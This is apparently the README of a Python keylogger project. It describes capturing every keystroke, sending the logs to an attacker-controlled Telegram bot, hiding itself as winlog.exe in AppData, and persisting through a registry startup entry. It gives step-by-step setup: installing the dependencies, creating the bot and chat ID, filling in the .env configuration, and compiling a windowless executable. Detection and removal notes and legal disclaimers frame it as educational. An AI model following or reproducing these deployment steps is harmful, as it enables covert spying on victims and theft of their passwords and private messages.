# Malicious Keylogger Script - WARNING

## ⚠️ CRITICAL WARNING: ILLEGAL AND DANGEROUS SOFTWARE ⚠️

This script is a **malicious keylogger** designed to compromise computer systems and steal sensitive information. Its use violates laws in nearly every country.

---

## What This Script Does

This Python script is a sophisticated keylogger with the following capabilities:

### 1. Keystroke Logging

- Records **every key pressed** on the target system
- Captures:
  - Regular text characters
  - Special keys (Shift, Ctrl, Alt, etc.)
  - Space bar
  - Function keys (F1-F12)
  - Arrow keys and navigation keys
  - All other keyboard inputs

### 2. Data Exfiltration

- Sends captured keystroke logs to a remote attacker via **Telegram API**
- Sends reports at configurable time intervals
- Handles connection failures gracefully (logs continue if internet is unavailable)

### 3. Persistence Mechanism

- Installs itself as a **hidden, persistent application** on Windows systems
- Copies itself to the hidden `AppData` directory
- Adds itself to Windows Registry startup programs
- Runs automatically when the victim logs in
- Hides its file using Windows system attributes

### 4. Stealth Features

- Runs in the background with no visible interface
- No taskbar icon or window
- Conceals its presence from casual users
- Marks itself as a hidden system file

---

## Prerequisites (For Educational Analysis Only)

This script requires specific Python libraries and system access.

### Python Libraries Needed

Install all dependencies using:

```bash
pip install -r requirements.txt
```

or install individually:

```bash
pip install pynput requests python-dotenv
```

### Required System Access

- Windows operating system (tested on Windows 10/11)
- Administrator privileges (for registry modifications)
- Internet connectivity (to send logs via Telegram)

### Configuration

The script now uses environment variables from a `.env` file for configuration. Copy the `env.example` file and rename it to `.env`, then fill in your values.

**Required Configuration File (.env):**

```env
# Telegram Bot Configuration
TELEGRAM_BOT_TOKEN=YOUR_BOT_TOKEN_HERE
TELEGRAM_CHAT_ID=YOUR_CHAT_ID_HERE
REPORT_INTERVAL=60
PERSISTENCE_FILENAME=winlog.exe
```

**Script Imports:**
The script now includes dotenv library for configuration:

```python
import dotenv
dotenv.load_dotenv()

# Configuration from .env file
bot_token = os.getenv('TELEGRAM_BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE')
chat_id = os.getenv('TELEGRAM_CHAT_ID', 'YOUR_CHAT_ID_HERE')
interval = int(os.getenv('REPORT_INTERVAL', 60))
filename = os.getenv('PERSISTENCE_FILENAME', "winlog.exe")
```

### How to Obtain Configuration Values

1. **Create a Telegram Bot**:
   - Open Telegram and search for `@BotFather`
   - Send `/newbot` and follow instructions
   - Copy the generated bot token

2. **Get Chat ID**:
   - Search for your bot username and start a conversation
   - Visit `https://api.telegram.org/bot{YOUR_BOT_TOKEN}/getUpdates`
   - Find your chat ID in the response

---

## Usage Instructions (ILLEGAL WITHOUT AUTHORIZATION)

### ❗ IMPORTANT: This is for educational purposes only. Unauthorized use is illegal. ❗

```bash
# 1. Install required libraries
pip install pynput requests

# 2. Modify the configuration variables in keylogger.py
#    Replace TERA_CHAT_ID with your actual chat ID

# 3. Run the script (Windows only)
python keylogger.py

# 4. Compile to executable (optional)
pip install pyinstaller
pyinstaller --noconsole --onefile keylogger.py
```

### What Happens When Run

1. The script checks if it's already installed in the hidden location
2. If not, it copies itself to `%APPDATA%/winlog.exe`
3. Sets the file as hidden and system file
4. Adds itself to Windows startup registry
5. Launches the new hidden instance
6. Starts capturing keystrokes
7. Sends logs to Telegram at specified intervals

---

## Detection and Removal

### Detection

- Check for `winlog.exe` in `%APPDATA%` directory
- Look for "WindowsUpdater" entry in startup programs
- Monitor network traffic to `api.telegram.org`

### Manual Removal Steps

1. Open Task Manager (Ctrl+Shift+Esc)
2. Look for any suspicious processes
3. Open Registry Editor (regedit)
4. Navigate to:
   `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`
5. Delete the "WindowsUpdater" entry
6. Delete `%APPDATA%/winlog.exe`
7. Restart the computer

---

## Legal Consequences

### This script violates:

- **Computer Fraud and Abuse Act (CFAA)** - United States
- **Cybercrime Laws** - Most countries worldwide
- **GDPR and Privacy Laws** - European Union and many other regions

### Penalties for Use:

- **Criminal Charges**: Felony charges with potential jail time
- **Fines**: Up to hundreds of thousands of dollars
- **Permanent Record**: Criminal record that affects employment and travel
- **Civil Lawsuits**: Victims can sue for damages

---

## Ethical and Legal Statement

This script is provided **exclusively for security research, educational purposes, and defensive security testing**. You must have **written, explicit authorization** from the system owner before using or testing this script on any computer system.

Unauthorized use of this script to gain access to computer systems or steal information is a **serious crime** with severe legal consequences.

---

## Educational Purpose Only

Understanding how keyloggers work helps security professionals:

- Develop better anti-malware solutions
- Educate users about cyber threats
- Implement effective security measures
- Test and strengthen system defenses

This knowledge should only be used to protect systems, not to attack them.
